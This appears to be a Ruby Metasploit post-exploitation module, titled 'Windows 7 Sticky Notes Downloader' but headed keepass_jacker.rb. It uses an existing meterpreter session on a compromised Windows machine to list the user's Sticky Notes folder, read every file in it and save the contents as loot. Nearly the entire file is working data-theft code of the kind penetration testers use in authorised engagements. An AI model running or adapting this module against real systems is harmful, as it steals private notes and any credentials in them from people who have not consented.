# $Id: keepass_jacker.rb 2012-05-01 rapid7 $

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/user_profiles'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::UserProfiles

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Windows 7 Sticky Notes Downloader',
				'Description'   => %q{
					This module downloads the file that contains Sticky Notes in windows 7
				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'balgan <balgan[at]ptcoresec.eu>'],
				'Version'       => '$Revision: 3195e713 $',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def run
		print_status("Checking if folder exists...")
			dir = "%appdata%\\Microsoft\\Sticky Notes\\"
			begin
				session.fs.dir.entries(dir)
				jack_stickynotesfiles(dir)
			rescue
				print_error("Path seems invalid: #{dir}")
				return nil
			end
	end

	def jack_stickynotesfiles(folder)
		print_status("Sticky notes found at:  #{folder}")
		print_status("Retrieving Sticky Notes Files...")
		files = [""]
		files = client.fs.dir.entries(folder)
		print_status("#{files}")
		files.each do |f|
		begin
			path = folder + f
			print_status("CURRENT PATH #{path}")
			data = ""
					next if f =~/^(\.+)$/
				begin
				filesaving = session.fs.file.new(path, "rb")
				until filesaving.eof?
					data << filesaving.read
				end
				store_loot("#{f}", "text/plain", session, data, f, "loot #{path}")
			rescue ::Interrupt
				raise $!
			rescue ::Exception => e
				print_error("Failed to download #{path}: #{e.class} #{e}")
			end
			end
		end
		end

	end